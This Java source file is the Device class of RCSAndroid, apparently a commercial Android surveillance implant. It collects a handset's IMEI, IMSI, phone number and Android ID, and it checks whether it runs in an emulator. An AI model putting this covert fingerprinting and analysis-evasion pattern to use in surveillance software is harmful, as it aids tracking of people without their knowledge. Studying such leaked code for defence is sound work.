/**********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : RCSAndroid
 * Created   : 06-dec-2010
 **********************************************/
package com.ht.RCSAndroidGUI;

import android.content.Context;
import android.provider.Settings;
import android.telephony.TelephonyManager;

import com.ht.RCSAndroidGUI.utils.Check;
import com.ht.RCSAndroidGUI.utils.Utils;

// TODO: Auto-generated Javadoc
/**
 * The Class Device.
 */
public class Device {

	/** The singleton. */
	private volatile static Device singleton;

	/**
	 * Self.
	 * 
	 * @return the device
	 */
	public static Device self() {
		if (singleton == null) {
			synchronized (Device.class) {
				if (singleton == null) {
					singleton = new Device();
				}
			}
		}

		return singleton;
	}

	private String deviceId;

	/**
	 * Gets the user id.
	 * 
	 * @return the user id
	 */
	public String getUserId() {
		// AccountManager ac = AccountManager.get(Status.getAppContext());
		return "MyUSERId";
	}

	/**
	 * Gets the device id.
	 * 
	 * @return the device id
	 */
	public String getDeviceId() {
		if(deviceId  == null){
			deviceId = Settings.System.getString(Status.getAppContext()
				.getContentResolver(), Settings.System.ANDROID_ID);
		}
		return deviceId;
	}

	/**
	 * Gets the phone number.
	 * 
	 * @return the phone number
	 */
	public String getPhoneNumber() {
		TelephonyManager mTelephonyMgr;
		mTelephonyMgr = (TelephonyManager) Status.getAppContext()
				.getSystemService(Context.TELEPHONY_SERVICE);
		return mTelephonyMgr.getLine1Number();
	}

	/**
	 * Gets the version.
	 * 
	 * @return the version
	 */
	public byte[] getVersion() {
		final byte[] versionRet = Utils.intToByteArray(Version.VERSION);
		Check.ensures(versionRet.length == 4, "Wrong version len");
		return versionRet;
	}

	/**
	 * Checks if is CDMA.
	 *
	 * @return true, if is CDMA
	 */
	public static boolean isCdma() {
		return false;
	}
	
	public static boolean isGprs() {
		return true;
	}
	
	public boolean isSimulator(){
		//return getDeviceId() == "9774d56d682e549c";
		return android.os.Build.MODEL.endsWith("sdk");
	}

	/**
	 * Gets the imei.
	 *
	 * @return the imei
	 */
	public String getImei() {
		final TelephonyManager telephonyManager = (TelephonyManager) Status
				.getAppContext().getSystemService(Context.TELEPHONY_SERVICE);
		return telephonyManager.getDeviceId();
	}

	/**
	 * Gets the imsi.
	 *
	 * @return the imsi
	 */
	public String getImsi() {
		final TelephonyManager telephonyManager = (TelephonyManager) Status
				.getAppContext().getSystemService(Context.TELEPHONY_SERVICE);
		return telephonyManager.getSubscriberId();
	}



	/*
	 * public void init() throws RCSException { this.androidId =
	 * Secure.getString(this.contentResolver, Secure.ANDROID_ID);
	 * 
	 * for (int i = 0; i < this.g_InstanceId.length; i++) { this.g_InstanceId[i]
	 * = 0; }
	 * 
	 * if (this.androidId.length() > this.g_InstanceId.length) { throw new
	 * RCSException("Android ID too long"); }
	 * 
	 * System.arraycopy(this.androidId.getBytes(), 0, this.g_InstanceId, 0,
	 * this.androidId.getBytes().length);
	 * 
	 * Log.d("RCS", "Device Unique ID: " + androidId); }
	 * 
	 * public byte[] getUniqueId() throws RCSException { if
	 * (this.androidId.length() == 0) { throw new
	 * RCSException("Object not yet initialized"); }
	 * 
	 * byte[] uniqueId = new byte[this.androidId.length()];
	 * 
	 * System.arraycopy(this.g_InstanceId, 0, uniqueId, 0, uniqueId.length);
	 * 
	 * return uniqueId; }
	 */
}
